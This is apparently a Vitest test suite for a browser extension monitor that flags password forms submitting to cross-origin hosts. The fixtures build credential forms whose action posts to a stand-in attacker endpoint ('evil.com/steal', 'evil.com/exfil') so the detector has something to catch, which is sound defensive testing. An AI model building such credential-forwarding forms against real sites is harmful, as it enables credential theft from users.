// @vitest-environment happy-dom
import { describe, expect, it, beforeEach, vi } from "vitest";
import {
  formHasCredentialFields,
  isCrossOriginUrl,
  extractOrigin,
  correlatesWithFormSubmit,
  createEmptyState,
  isStateExpired,
  JS_BEHAVIOR_STATE_TTL_MS,
  initJsBehaviorMonitor,
  _resetState,
} from "../extension/src/content/js_behavior_monitor";

beforeEach(() => {
  _resetState();
  document.body.innerHTML = "";
});

describe("formHasCredentialFields", () => {
  it("returns true when form has password input", () => {
    const form = document.createElement("form");
    const input = document.createElement("input");
    input.type = "password";
    form.appendChild(input);
    expect(formHasCredentialFields(form)).toBe(true);
  });

  it("returns false when form has no password input", () => {
    const form = document.createElement("form");
    const input = document.createElement("input");
    input.type = "text";
    form.appendChild(input);
    expect(formHasCredentialFields(form)).toBe(false);
  });

  it("returns false for empty form", () => {
    const form = document.createElement("form");
    expect(formHasCredentialFields(form)).toBe(false);
  });

  it("detects nested password fields", () => {
    const form = document.createElement("form");
    const div = document.createElement("div");
    const input = document.createElement("input");
    input.type = "password";
    div.appendChild(input);
    form.appendChild(div);
    expect(formHasCredentialFields(form)).toBe(true);
  });
});

describe("isCrossOriginUrl", () => {
  it("returns false for same-origin URL", () => {
    expect(isCrossOriginUrl(location.origin + "/path")).toBe(false);
  });

  it("returns true for different origin", () => {
    expect(isCrossOriginUrl("https://evil.com/steal")).toBe(true);
  });

  it("returns false for relative URL", () => {
    expect(isCrossOriginUrl("/login")).toBe(false);
  });

  it("returns false for empty string", () => {
    expect(isCrossOriginUrl("")).toBe(false);
  });

  it("returns false for invalid URL", () => {
    expect(isCrossOriginUrl("not a url ::: ///")).toBe(false);
  });

  it("returns true for different port", () => {
    expect(isCrossOriginUrl("http://localhost:9999/path")).toBe(true);
  });

  it("returns false for opaque and script-like schemes", () => {
    expect(isCrossOriginUrl("data:text/html,<form></form>")).toBe(false);
    expect(isCrossOriginUrl("javascript:void(0)")).toBe(false);
    expect(isCrossOriginUrl("blob:https://example.com/id")).toBe(false);
  });
});

describe("extractOrigin", () => {
  it("extracts origin from absolute URL", () => {
    expect(extractOrigin("https://example.com/path?q=1")).toBe("https://example.com");
  });

  it("returns empty for empty input", () => {
    expect(extractOrigin("")).toBe("");
  });

  it("resolves relative URL against current origin", () => {
    const result = extractOrigin("/relative/path");
    expect(result).toBe(location.origin);
  });

  it("handles URL that resolves to current origin", () => {
    // ":::invalid" is treated as a relative path by URL constructor
    expect(extractOrigin(":::invalid")).toBe(location.origin);
  });

  it("returns empty for opaque and script-like schemes", () => {
    expect(extractOrigin("data:text/html,<form></form>")).toBe("");
    expect(extractOrigin("javascript:void(0)")).toBe("");
    expect(extractOrigin("blob:https://example.com/id")).toBe("");
  });
});

describe("correlatesWithFormSubmit", () => {
  it("returns false with no recent form submits", () => {
    expect(correlatesWithFormSubmit(Date.now())).toBe(false);
  });

  it("returns true after credential form submit within window", () => {
    const postSignal = vi.fn();
    initJsBehaviorMonitor({ debug: false, mode: "smart", postSignal });

    const form = document.createElement("form");
    form.action = "https://evil.com/steal";
    const pw = document.createElement("input");
    pw.type = "password";
    form.appendChild(pw);
    document.body.appendChild(form);

    form.dispatchEvent(new Event("submit", { bubbles: true }));

    expect(correlatesWithFormSubmit(Date.now())).toBe(true);
  });
});

describe("createEmptyState", () => {
  it("returns zeroed state", () => {
    const state = createEmptyState();
    expect(state.score).toBe(0);
    expect(state.lastSignalTs).toBe(0);
    expect(state.signalCounts.formSubmitSuspicious).toBe(0);
  });
});

describe("isStateExpired", () => {
  it("returns true for empty state", () => {
    expect(isStateExpired(createEmptyState())).toBe(true);
  });

  it("returns false for recent state", () => {
    const state = createEmptyState();
    state.lastSignalTs = Date.now();
    expect(isStateExpired(state)).toBe(false);
  });

  it("returns true when past TTL", () => {
    const state = createEmptyState();
    state.lastSignalTs = Date.now() - JS_BEHAVIOR_STATE_TTL_MS - 1;
    expect(isStateExpired(state)).toBe(true);
  });
});

describe("initJsBehaviorMonitor form submit detection", () => {
  it("emits signal for cross-origin credential form submit", () => {
    const postSignal = vi.fn();
    initJsBehaviorMonitor({ debug: false, mode: "smart", postSignal });

    const form = document.createElement("form");
    form.action = "https://evil.com/steal";
    const pw = document.createElement("input");
    pw.type = "password";
    form.appendChild(pw);
    document.body.appendChild(form);

    form.dispatchEvent(new Event("submit", { bubbles: true }));

    expect(postSignal).toHaveBeenCalledWith(
      "ns-js-form-submit-suspicious",
      expect.objectContaining({
        hasCredentialFields: true,
        isCrossOrigin: true,
        destinationOrigin: "https://evil.com",
      })
    );
  });

  it("does not emit signal for same-origin form submit", () => {
    const postSignal = vi.fn();
    initJsBehaviorMonitor({ debug: false, mode: "smart", postSignal });

    const form = document.createElement("form");
    form.action = "/login";
    const pw = document.createElement("input");
    pw.type = "password";
    form.appendChild(pw);
    document.body.appendChild(form);

    form.dispatchEvent(new Event("submit", { bubbles: true }));

    expect(postSignal).not.toHaveBeenCalled();
  });

  it("does not emit signal when mode is off", () => {
    const postSignal = vi.fn();
    initJsBehaviorMonitor({ debug: false, mode: "off", postSignal });

    const form = document.createElement("form");
    form.action = "https://evil.com/steal";
    const pw = document.createElement("input");
    pw.type = "password";
    form.appendChild(pw);
    document.body.appendChild(form);

    form.dispatchEvent(new Event("submit", { bubbles: true }));

    expect(postSignal).not.toHaveBeenCalled();
  });

  it("emits signal for non-credential form with dynamically changed action", () => {
    const postSignal = vi.fn();
    const form = document.createElement("form");
    form.setAttribute("action", "/safe-endpoint");
    document.body.appendChild(form);

    initJsBehaviorMonitor({ debug: false, mode: "smart", postSignal });

    // Dynamically change the action to a cross-origin URL
    form.action = "https://evil.com/exfil";

    form.dispatchEvent(new Event("submit", { bubbles: true }));

    expect(postSignal).toHaveBeenCalledWith(
      "ns-js-form-submit-suspicious",
      expect.objectContaining({
        actionDynamicallyChanged: true,
      })
    );
  });

  it("does not mark an unobserved initial cross-origin action as dynamic", () => {
    const postSignal = vi.fn();
    initJsBehaviorMonitor({ debug: false, mode: "smart", postSignal });

    const form = document.createElement("form");
    form.setAttribute("action", "https://payments.example/submit");
    document.body.appendChild(form);

    form.dispatchEvent(new Event("submit", { bubbles: true }));

    expect(postSignal).not.toHaveBeenCalled();
  });

  it("uses submitter formaction as the effective destination", () => {
    const postSignal = vi.fn();
    initJsBehaviorMonitor({ debug: false, mode: "smart", postSignal });

    const form = document.createElement("form");
    form.action = "/login";
    const pw = document.createElement("input");
    pw.type = "password";
    const button = document.createElement("button");
    button.type = "submit";
    button.setAttribute("formaction", "https://evil.com/steal");
    form.append(pw, button);
    document.body.appendChild(form);

    form.dispatchEvent(new SubmitEvent("submit", { bubbles: true, submitter: button }));

    expect(postSignal).toHaveBeenCalledWith(
      "ns-js-form-submit-suspicious",
      expect.objectContaining({
        isCrossOrigin: true,
        destinationOrigin: "https://evil.com",
      })
    );
  });

  it("does not stack submit listeners when initialized twice", () => {
    const postSignal = vi.fn();
    initJsBehaviorMonitor({ debug: false, mode: "smart", postSignal });
    initJsBehaviorMonitor({ debug: false, mode: "smart", postSignal });

    const form = document.createElement("form");
    form.action = "https://evil.com/steal";
    const pw = document.createElement("input");
    pw.type = "password";
    form.appendChild(pw);
    document.body.appendChild(form);

    form.dispatchEvent(new Event("submit", { bubbles: true }));

    expect(postSignal).toHaveBeenCalledTimes(1);
  });
});
